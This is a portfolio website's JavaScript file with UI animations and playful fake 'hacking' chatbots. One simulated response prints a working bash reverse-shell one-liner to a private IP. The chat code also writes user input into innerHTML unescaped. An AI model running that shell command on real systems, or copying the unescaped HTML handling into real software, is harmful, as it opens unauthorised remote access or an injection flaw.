// signed: Amir Javarsineh
/*
    File: main.js
    Purpose: handles boot screen, observers, UI interactions, and interactive terminal
*/

// Boot Screen Animation
document.addEventListener('DOMContentLoaded', () => {
    const bootScreen = document.getElementById('bootScreen');
    
    // Hide boot screen after animation completes
    setTimeout(() => {
        bootScreen.classList.add('fade-out');
        setTimeout(() => {
            bootScreen.style.display = 'none';
        }, 500);
    }, 6000);
    
    // Allow skipping with any key press or click
    const skipBoot = () => {
        bootScreen.classList.add('fade-out');
        setTimeout(() => {
            bootScreen.style.display = 'none';
        }, 500);
    };
    
    document.addEventListener('keydown', skipBoot, { once: true });
    bootScreen.addEventListener('click', skipBoot, { once: true });
});

// Observer for fade-in elements
const observerOptions = {
    threshold: 0.1,
    rootMargin: '0px 0px -100px 0px'
};

const observer = new IntersectionObserver((entries) => {
    entries.forEach(entry => {
        if (entry.isIntersecting) {
            entry.target.style.opacity = '1';
            entry.target.style.transform = 'translateY(0)';
        }
    });
}, observerOptions);

document.querySelectorAll('.fade-in').forEach(el => {
    el.style.opacity = '0';
    el.style.transform = 'translateY(20px)';
    el.style.transition = 'all 0.6s ease-out';
    observer.observe(el);
});

// Skill bars animation (fixed)
const skillObserver = new IntersectionObserver((entries) => {
    entries.forEach(entry => {
        if (entry.isIntersecting) {
            const progressBars = entry.target.querySelectorAll('.skill-progress');
            progressBars.forEach(bar => {
                let width = bar.style.width;
                if (!width) {
                    width = getComputedStyle(bar).width;
                }
                bar.style.width = '0%';
                setTimeout(() => {
                    bar.style.width = width;
                }, 100);
            });
            skillObserver.unobserve(entry.target);
        }
    });
}, { threshold: 0.5 });

document.querySelectorAll('.skill-category').forEach(category => {
    skillObserver.observe(category);
});

// Mobile menu toggle
function toggleMenu() {
    const navLinks = document.getElementById('navLinks');
    navLinks.classList.toggle('active');
}

function closeMenu() {
    const navLinks = document.getElementById('navLinks');
    navLinks.classList.remove('active');
}

// Smooth scroll for anchor links
document.addEventListener('DOMContentLoaded', () => {
    document.querySelectorAll('a[href^="#"]').forEach(link => {
        link.addEventListener('click', (e) => {
            const href = link.getAttribute('href');
            if (href !== '#') {
                e.preventDefault();
                const target = document.querySelector(href);
                if (target) {
                    const offset = 80;
                    const targetPosition = target.offsetTop - offset;
                    window.scrollTo({
                        top: targetPosition,
                        behavior: 'smooth'
                    });
                }
            }
        });
    });

    const lazyObserver = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                entry.target.classList.add('visible');
                lazyObserver.unobserve(entry.target);
            }
        });
    }, { threshold: 0.1 });

    document.querySelectorAll('section').forEach(section => {
        section.classList.add('lazy-section');
        lazyObserver.observe(section);
    });
});

let scrollTimeout;
window.addEventListener('scroll', () => {
    if (scrollTimeout) {
        clearTimeout(scrollTimeout);
    }
    scrollTimeout = setTimeout(() => {
        document.body.style.overflowY = 'auto';
    }, 150);
}, { passive: true });



// End of file - signed: Amir Javarsineh



// ============================================
// Typewriter Effect for Tagline
// ============================================
(function initTypewriter() {
    const element = document.getElementById('typewriter');
    if (!element) return;
    
    const phrases = [
        "// CyberSecurity Engineer",
        "// Network Engineer",
        "// Web Developer"
    ];
    
    let phraseIndex = 0;
    let charIndex = 0;
    let isDeleting = false;
    let currentText = '';
    
    function typeEffect() {
        const fullText = phrases[phraseIndex];
        
        if (isDeleting) {
            currentText = fullText.substring(0, charIndex - 1);
            charIndex--;
        } else {
            currentText = fullText.substring(0, charIndex + 1);
            charIndex++;
        }
        
        element.textContent = currentText;
        
        if (!isDeleting && charIndex === fullText.length) {
            // Pause before deleting
            isDeleting = true;
            setTimeout(typeEffect, 2000);
            return;
        }
        
        if (isDeleting && charIndex === 0) {
            isDeleting = false;
            phraseIndex = (phraseIndex + 1) % phrases.length;
            setTimeout(typeEffect, 500);
            return;
        }
        
        const speed = isDeleting ? 50 : 100;
        setTimeout(typeEffect, speed);
    }
    
    // Start the effect after a short delay
    setTimeout(typeEffect, 500);
})();   






// ============================================
// Fullscreen Terminal Mode
// ============================================
(function initFullscreenTerminal() {
    const openBtn = document.getElementById('fullscreenTerminalBtn');
    const overlay = document.getElementById('fullscreenTerminal');
    const closeBtn = document.getElementById('closeFullscreenTerminal');
    const inputEl = document.getElementById('fullscreenInput');
    const terminalBody = document.getElementById('fullscreenTerminalBody');
    
    if (!openBtn || !overlay || !closeBtn || !inputEl || !terminalBody) return;
    
    // Same commands as interactive terminal
    const commands = {
        help: () => {
            return `Available commands:<br>
- <span class="cmd-highlight">help</span> : Show this message<br>
- <span class="cmd-highlight">skills</span> : List technical skills<br>
- <span class="cmd-highlight">contact</span> : Show contact info<br>
- <span class="cmd-highlight">clear</span> : Clear terminal screen<br>
- <span class="cmd-highlight">whoami</span> : About me<br>
- <span class="cmd-highlight">exit</span> : Close fullscreen mode`;
        },
        skills: () => {
            return `CyberSecurity: Network Security | Penetration Testing | SOC | Vuln Assessment | Wireshark <br> <br>
Networking: Network Eng | CCNA | TCP/IP | Firewall/VPN | Routing | VLANs<br> <br>
SysAdmin: Windows Server | AD | GPO | DNS/DHCP | VMware | Virtualization | Hyper-V<br> <br>
Programming: Python | C | OOP | Data Structures | Linux | Git<br> <br>
Backend/Database: Django | MySQL | PostgreSQL | DBMS<br> <br>
Frontend: HTML/CSS | JS | Bootstrap/Tailwind | SASS| jQuery/AJAX`;
        },
        contact: () => {
            return `Email: amirjavarsineh7@gmail.com<br>
GitHub: github.com/amirjavarsineh<br>
LinkedIn: linkedin.com/in/amirjavarsineh<br>
Telegram: @amirjavarsineh`;
        },
        whoami: () => {
            return `Amir Javarsineh (امیر جاورسینه)<br>
CyberSecurity Engineer, Network Engineer & Web Developer based in Iran.<br>
Passionate about building secure systems and creative coding.`;
        },
        exit: () => {
            overlay.classList.remove('open');
            document.body.style.overflow = '';
            return null;
        }
    };
    
    function addLine(text, isOutput = true) {
        const lineDiv = document.createElement('div');
        lineDiv.className = 'term-line';
        if (isOutput && text !== null) {
            lineDiv.innerHTML = `<span class="terminal-output">${text}</span>`;
        } else if (text !== null) {
            lineDiv.innerHTML = text;
        }
        if (text !== null) {
            terminalBody.insertBefore(lineDiv, terminalBody.lastElementChild);
            terminalBody.scrollTop = terminalBody.scrollHeight;
        }
        return lineDiv;
    }
    
    function executeCommand(cmd) {
        const cmdLower = cmd.trim().toLowerCase();
        if (cmdLower === 'clear') {
            const lines = terminalBody.querySelectorAll('.term-line:not(:last-child)');
            lines.forEach(line => line.remove());
            return;
        }
        let response = '';
        if (commands[cmdLower]) {
            response = commands[cmdLower]();
            if (response === null) return;
        } else if (cmdLower !== '') {
            response = `Command not found: ${cmd}. Type <span class="cmd-highlight">help</span> for available commands.`;
        }
        if (response) {
            addLine(response, true);
        }
    }
    
    function handleKey(e) {
        if (e.key === 'Enter') {
            e.preventDefault();
            const cmd = inputEl.innerText;
            if (cmd.trim() !== '') {
                const cmdLine = document.createElement('div');
                cmdLine.className = 'term-line';
                cmdLine.innerHTML = `<span class="prompt">$</span> ${cmd}`;
                terminalBody.insertBefore(cmdLine, terminalBody.lastElementChild);
                executeCommand(cmd);
            }
            inputEl.innerText = '';
            terminalBody.scrollTop = terminalBody.scrollHeight;
        }
    }
    
    function openFullscreen() {
        overlay.classList.add('open');
        document.body.style.overflow = 'hidden';
        setTimeout(() => {
            inputEl.focus();
        }, 100);
    }
    
    function closeFullscreen() {
        overlay.classList.remove('open');
        document.body.style.overflow = '';
        // Optionally clear terminal or keep as is
    }
    
    openBtn.addEventListener('click', openFullscreen);
    closeBtn.addEventListener('click', closeFullscreen);
    inputEl.addEventListener('keydown', handleKey);
    terminalBody.addEventListener('click', () => {
        inputEl.focus();
    });
    
    // Close on ESC key
    document.addEventListener('keydown', (e) => {
        if (e.key === 'Escape' && overlay.classList.contains('open')) {
            closeFullscreen();
        }
    });
})();








// ============================================
// Firewall Log Simulator (Typewriter effect)
// ============================================
// (function initFirewallLog() {
//     const logContainer = document.getElementById('logTerminal');
//     const generateBtn = document.getElementById('generateLogBtn');
    
//     if (!logContainer || !generateBtn) return;

//     // لیست پیام‌های جعلی لاگ فایروال
//     const logMessages = [
//         "[BLOCKED] 192.168.1.105:443 -> Suspicious traffic detected",
//         "[ALLOWED] 10.0.0.22:80 -> HTTP request to example.com",
//         "[BLOCKED] 203.0.113.5:22 -> SSH brute force attempt",
//         "[ALERT] Intrusion Prevention System: Port scan from 45.33.22.11",
//         "[BLOCKED] 198.51.100.67:3389 -> RDP access denied",
//         "[INFO] Outbound connection to 93.184.216.34:443 (HTTPS) allowed",
//         "[BLOCKED] 192.168.1.77:53 -> DNS tunneling attempt",
//         "[ALERT] High severity: Multiple failed logins from 10.10.0.8",
//         "[ALLOWED] 172.16.5.9:12345 -> NTP traffic",
//         "[BLOCKED] 185.130.5.253:8080 -> Probe against proxy service"
//     ];
    
//     // تابع برای تولید یک لاگ جدید (با افکت تایپ)
//     function addLogWithTyping(text) {
//         const lineDiv = document.createElement('div');
//         lineDiv.className = 'log-line';
//         lineDiv.textContent = '';  // شروع خالی
//         logContainer.appendChild(lineDiv);
        
//         let i = 0;
//         function typeNextChar() {
//             if (i < text.length) {
//                 lineDiv.textContent += text.charAt(i);
//                 i++;
//                 setTimeout(typeNextChar, 20 + Math.random() * 15); // سرعت متغیر بین 20-35 میلی‌ثانیه
//             } else {
//                 // اسکرول خودکار به پایین
//                 logContainer.scrollTop = logContainer.scrollHeight;
//             }
//         }
//         typeNextChar();
//     }
    
//     // تابع تولید لاگ تصادفی
//     function generateRandomLog() {
//         const randomIndex = Math.floor(Math.random() * logMessages.length);
//         let message = logMessages[randomIndex];
        
//         // اضافه کردن timestamp جعلی
//         const now = new Date();
//         const timestamp = `[${now.getFullYear()}-${String(now.getMonth()+1).padStart(2,'0')}-${String(now.getDate()).padStart(2,'0')} ${String(now.getHours()).padStart(2,'0')}:${String(now.getMinutes()).padStart(2,'0')}:${String(now.getSeconds()).padStart(2,'0')}]`;
        
//         const fullLog = `${timestamp} ${message}`;
//         addLogWithTyping(fullLog);
//     }
    
//     // رویداد کلیک روی دکمه
//     generateBtn.addEventListener('click', () => {
//         generateRandomLog();
//     });
    
//     // (اختیاری) تولید یک لاگ اولیه خوش‌آمدگویی تایپ‌شده
//     setTimeout(() => {
//         addLogWithTyping(`[${new Date().toISOString().slice(0,19).replace('T',' ')}] [INFO] Firewall log simulator ready.`);
//     }, 500);
// })();












// ============================================
// Hacker Chatbot (Simple Interactive)
// ============================================
(function initHackerChatbot() {
    const messagesDiv = document.getElementById('chatbotMessages');
    const inputEl = document.getElementById('chatbotInput');
    const sendBtn = document.getElementById('chatbotSendBtn');
    const clearBtn = document.getElementById('chatbotClearBtn');
    
    if (!messagesDiv || !inputEl || !sendBtn) return;
    
    function addMessage(text, type = 'bot') {
        const msgDiv = document.createElement('div');
        msgDiv.className = `chatbot-message ${type}`;
        msgDiv.innerHTML = type === 'bot' ? `> ${text}` : `> ${text}`;
        messagesDiv.appendChild(msgDiv);
        messagesDiv.scrollTop = messagesDiv.scrollHeight;
        return msgDiv;
    }
    
    function processCommand(cmd) {
        const lower = cmd.trim().toLowerCase();
        
        const responses = {
            help: () => `Available commands:<br>
- <span class="cmd-highlight">help</span> : Show this message<br>
- <span class="cmd-highlight">whoami</span> : About this bot<br>
- <span class="cmd-highlight">hack</span> : Simulate a hack attempt<br>
- <span class="cmd-highlight">scan</span> : Port scan simulation<br>
- <span class="cmd-highlight">clear</span> : Clear chat<br>
- <span class="cmd-highlight">exit</span> : Close (just for fun)`,
            
            whoami: () => `I am AI_H4CK3R, a simulated hacking assistant. I don't do real hacking.`,
            
            hack: () => `[!] Accessing mainframe...<br>[!] Bypassing firewall...<br>[✗] ACCESS DENIED. Your IP has been logged. (just kidding)`,
            
            scan: () => `[🔍] Scanning 127.0.0.1 ports...<br>Port 22: <span style="color:#0f0">OPEN</span> (SSH)<br>Port 80: <span style="color:#0f0">OPEN</span> (HTTP)<br>Port 443: <span style="color:#0f0">OPEN</span> (HTTPS)<br>Port 3306: <span style="color:#f44">FILTERED</span><br>Scan complete.`,
            
            clear: () => {
                messagesDiv.innerHTML = '';
                addMessage('Chat cleared. Type <span class="cmd-highlight">help</span>', 'bot');
                return null;
            },
            
            exit: () => {
                addMessage('Nice try. But you cannot escape the matrix.', 'bot');
                return null;
            }
        };
        
        if (responses[lower]) {
            return responses[lower]();
        } else if (lower !== '') {
            return `Unknown command: ${cmd}. Type <span class="cmd-highlight">help</span>.`;
        }
        return null;
    }
    
    function handleUserMessage() {
        const userText = inputEl.value.trim();
        if (userText === '') return;
        
        addMessage(userText, 'user');
        inputEl.value = '';
        
        const response = processCommand(userText);
        if (response) {
            setTimeout(() => {
                addMessage(response, 'bot');
            }, 200);
        }
    }
    
    sendBtn.addEventListener('click', handleUserMessage);
    inputEl.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') handleUserMessage();
    });
    
    if (clearBtn) {
        clearBtn.addEventListener('click', () => {
            messagesDiv.innerHTML = '';
            addMessage('Chat cleared by user.', 'bot');
        });
    }
    
    inputEl.focus();
})();






// ============================================
// Hero Chatbot (Replaces interactive terminal)
// ============================================

(function initHeroChatbot() {
    const messagesDiv = document.getElementById('chatbotHeroMessages');
    const inputEl = document.getElementById('chatbotHeroInput');
    const sendBtn = document.getElementById('chatbotHeroSendBtn');
    const clearBtn = document.getElementById('chatbotClearHeroBtn');
    
    if (!messagesDiv || !inputEl || !sendBtn) return;
    
    const commands = {
        help: () => `Available commands:<br>
<span class="cmd-highlight">📌 General</span><br>
- <span class="cmd-highlight">help</span> : Show this message<br>
- <span class="cmd-highlight">skills</span> : List technical skills<br>
- <span class="cmd-highlight">contact</span> : Show contact info<br>
- <span class="cmd-highlight">whoami</span> : About me<br>
- <span class="cmd-highlight">clear</span> : Clear chat<br>
<br>
<span class="cmd-highlight">💀 Hacking Simulations</span><br>
- <span class="cmd-highlight">nmap &lt;target&gt;</span> : Port scan simulation<br>
- <span class="cmd-highlight">hydra &lt;service&gt;</span> : Brute-force simulation<br>
- <span class="cmd-highlight">sqlmap &lt;url&gt;</span> : SQL injection simulation<br>
- <span class="cmd-highlight">exploit</span> : Launch a random exploit<br>
- <span class="cmd-highlight">reverse-shell</span> : Fake reverse shell<br>
- <span class="cmd-highlight">crack &lt;hash&gt;</span> : Crack a fake hash<br>
- <span class="cmd-highlight">enum</span> : Enumerate system info<br>
- <span class="cmd-highlight">pwn</span> : Attempt to pwn target<br>
- <span class="cmd-highlight">backdoor</span> : Install fake backdoor<br>
- <span class="cmd-highlight">persistence</span> : Establish persistence<br>
- <span class="cmd-highlight">root</span> : Privilege escalation`,

        skills: () => `<span class="cmd-highlight">🔹 CyberSecurity</span><br>
- Network Security <br>
- Penetration Testing / CEH <br>
- SOC Operations <br>
- Vulnerability Assessment <br>
- Wireshark <br><br>
<span class="cmd-highlight">🔹 Networking</span><br>
- Network Engineering <br>
- Cisco / CCNA <br>
- TCP/IP & Subnetting <br>
- Firewall & VPN <br>
- Routing & Switching <br>
- VLANs <br><br>
<span class="cmd-highlight">🔹 System Administration</span><br>
- Windows Server <br>
- Active Directory <br>
- Group Policy / GPO <br>
- DNS / DHCP Server <br>
- VMware ESXi <br>
- Server Virtualization <br>
- Hyper-V <br><br>
<span class="cmd-highlight">🔹 Programming</span><br>
- Python <br>
- C <br>
- OOP <br>
- Data Structures <br>
- Linux <br>
- Git <br><br>
<span class="cmd-highlight">🔹 Backend & Database</span><br>
- Django <br>
- MySQL <br>
- PostgreSQL <br>
- DBMS <br><br>
<span class="cmd-highlight">🔹 Frontend</span><br>
- HTML5 / CSS3 <br>
- JavaScript <br>
- Bootstrap / Tailwind <br>
- SASS <br>
- jQuery / AJAX`,

        contact: () => `Email: amirjavarsineh7@gmail.com<br>
GitHub: github.com/amirjavarsineh<br>
LinkedIn: linkedin.com/in/amirjavarsineh<br>
Telegram: @amirjavarsineh`,

        whoami: () => `Amir Javarsineh (امیر جاورسینه)<br>
CyberSecurity Engineer, Network Engineer & Web Developer based in Iran.<br>
Passionate about building secure systems and creative coding.`,

        clear: () => {
            messagesDiv.innerHTML = '';
            addMessage('Chat cleared. Type <span class="cmd-highlight">help</span>', 'bot');
            return null;
        },

        // ---------- دستورات هکری ----------
        nmap: (target) => {
            if (!target) return 'Usage: nmap &lt;target&gt; (e.g., nmap 192.168.1.1)<br>🔍 Simulating port scan...';
            return `[🔍] Scanning ${target}...<br>
[+] Port 22/tcp: <span style="color:#0f0">OPEN</span> (SSH)<br>
[+] Port 80/tcp: <span style="color:#0f0">OPEN</span> (HTTP)<br>
[+] Port 443/tcp: <span style="color:#0f0">OPEN</span> (HTTPS)<br>
[+] Port 3306/tcp: <span style="color:#f44">FILTERED</span> (MySQL)<br>
[*] Scan completed. 3 ports open, 1 filtered.`;
        },

        hydra: (service) => {
            if (!service) return 'Usage: hydra &lt;service&gt; (e.g., hydra ssh)<br>💀 Simulating brute-force...';
            if (service.toLowerCase() === 'ssh') {
                return `[💀] Hydra attacking SSH...<br>
[INFO] Target: 192.168.1.1<br>
[INFO] Attempting admin → <span style="color:#f44">FAILED</span><br>
[INFO] Attempting password → <span style="color:#f44">FAILED</span><br>
[INFO] Attempting root → <span style="color:#0f0">SUCCESS</span><br>
[✔] Password found: root`;
            }
            return `[💀] Hydra attacking ${service}...<br>[!] Service simulation not detailed. Try "hydra ssh".`;
        },

        sqlmap: (url) => {
            if (!url) return 'Usage: sqlmap &lt;url&gt; (e.g., sqlmap http://test.com?id=1)<br>💉 Simulating SQL injection...';
            return `[💉] sqlmap on ${url}<br>
[INFO] Parameter 'id' is vulnerable (MySQL)<br>
[INFO] Extracting database: testdb<br>
[INFO] Dumping table 'users'... admin:5f4dcc3b5aa765d61d8327deb882cf99<br>
[✔] Data retrieved.`;
        },

        exploit: () => {
            const exploits = [
                'CVE-2024-1234: Remote Code Execution <span style="color:#0f0">SUCCESS</span>',
                'MS17-010 (EternalBlue): Meterpreter session opened',
                'CVE-2021-44228 (Log4Shell): Reverse shell obtained'
            ];
            return `[⚡] Launching exploit...<br>${exploits[Math.floor(Math.random() * exploits.length)]}<br>[!] Educational simulation.`;
        },

        'reverse-shell': () => {
            return `[🌀] Generating reverse shell...<br>
[+] Payload: bash -i >& /dev/tcp/192.168.1.100/4444 0>&1<br>
[+] Listener started on port 4444<br>
<span style="color:#0f0">[✔] Connection received! Shell: root@target</span><br>
[*] Simulation only.`;
        },

        crack: (hash) => {
            if (!hash) return 'Usage: crack &lt;hash&gt;<br>🔓 Simulating hash cracking...';
            const fakeDb = {
                '5f4dcc3b5aa765d61d8327deb882cf99': 'password',
                '21232f297a57a5a743894a0e4a801fc3': 'admin'
            };
            if (fakeDb[hash]) return `[🔓] Hash ${hash} cracked: <span style="color:#0f0">${fakeDb[hash]}</span>`;
            return `[🔓] Hash ${hash} not found in rainbow table.`;
        },

        enum: () => {
            return `[🔍] Enumeration...<br>
OS: Linux target 5.15.0<br>
User: www-data (uid=33)<br>
Suid binaries: /bin/su, /usr/bin/sudo<br>
Cron jobs: backup.sh every 5 min<br>
[*] Enumeration complete.`;
        },

        pwn: () => {
            const outcomes = ['<span style="color:#0f0">[✔] Target pwned! Root access.</span>', '<span style="color:#f44">[✗] Failed. EDR blocked.</span>'];
            return `[💀] Attempting pwn...<br>${outcomes[Math.floor(Math.random() * outcomes.length)]}`;
        },

        backdoor: () => {
            return `[🌀] Installing backdoor...<br>
[+] Webshell at /var/www/html/shell.php<br>
<span style="color:#0f0">[✔] Backdoor active. Password: h4x0r</span>`;
        },

        persistence: () => {
            return `[🔄] Persistence...<br>
[+] Systemd service evil.service created<br>
[+] SSH key added<br>
<span style="color:#0f0">[✔] Persistence established.</span>`;
        },

        root: () => {
            return `[👑] Privilege escalation via Dirty Pipe...<br>
<span style="color:#0f0">[✔] You are now root! 🎉</span><br>
[*] Simulation only.`;
        }
    };
    
    function addMessage(text, type = 'bot') {
        const msgDiv = document.createElement('div');
        msgDiv.className = `chatbot-message ${type}`;
        msgDiv.innerHTML = type === 'bot' ? `> ${text}` : `> ${text}`;
        messagesDiv.appendChild(msgDiv);
        messagesDiv.scrollTop = messagesDiv.scrollHeight;
        return msgDiv;
    }
    
    function processCommand(cmd) {
        const trimmed = cmd.trim();
        if (trimmed === '') return null;
        const lower = trimmed.toLowerCase();
        
        // دستورات بدون آرگومان
        const noArgCommands = ['clear', 'exploit', 'reverse-shell', 'enum', 'pwn', 'backdoor', 'persistence', 'root'];
        if (noArgCommands.includes(lower)) {
            if (lower === 'clear') return commands.clear();
            return commands[lower]();
        }
        
        // دستورات با آرگومان
        const parts = lower.split(/\s+/);
        const mainCmd = parts[0];
        const arg = parts.slice(1).join(' ');
        
        if (mainCmd === 'nmap' && commands.nmap) return commands.nmap(arg);
        if (mainCmd === 'hydra' && commands.hydra) return commands.hydra(arg);
        if (mainCmd === 'sqlmap' && commands.sqlmap) return commands.sqlmap(arg);
        if (mainCmd === 'crack' && commands.crack) return commands.crack(arg);
        
        // دستورات عمومی بدون آرگومان (help, skills, contact, whoami)
        if (commands[lower]) return commands[lower]();
        
        return `Unknown command: ${cmd}. Type <span class="cmd-highlight">help</span>.`;
    }
    
    function handleUserMessage() {
        const userText = inputEl.value.trim();
        if (userText === '') return;
        addMessage(userText, 'user');
        inputEl.value = '';
        const response = processCommand(userText);
        if (response) setTimeout(() => addMessage(response, 'bot'), 200);
    }
    
    sendBtn.addEventListener('click', handleUserMessage);
    inputEl.addEventListener('keypress', e => { if (e.key === 'Enter') handleUserMessage(); });
    
    if (clearBtn) {
        clearBtn.addEventListener('click', () => {
            messagesDiv.innerHTML = '';
            addMessage('Chat cleared by user.', 'bot');
        });
    }
    
    inputEl.focus();
})();






// ============================================
// Matrix Digital Clock (live update)
// ============================================
(function initMatrixDigitalClock() {
    const timeSpan = document.getElementById('clockTime');
    const dateSpan = document.getElementById('clockDate');
    if (!timeSpan || !dateSpan) return;
    
    function updateClock() {
        const now = new Date();
        // ساعت و دقیقه و ثانیه با فرمت ۲ رقمی
        const hours = String(now.getHours()).padStart(2, '0');
        const minutes = String(now.getMinutes()).padStart(2, '0');
        const seconds = String(now.getSeconds()).padStart(2, '0');
        timeSpan.textContent = `${hours}:${minutes}:${seconds}`;
        
        // تاریخ به فرمت YYYY/MM/DD
        const year = now.getFullYear();
        const month = String(now.getMonth() + 1).padStart(2, '0');
        const day = String(now.getDate()).padStart(2, '0');
        dateSpan.textContent = `${year}/${month}/${day}`;
    }
    
    updateClock();
    setInterval(updateClock, 1000);
})();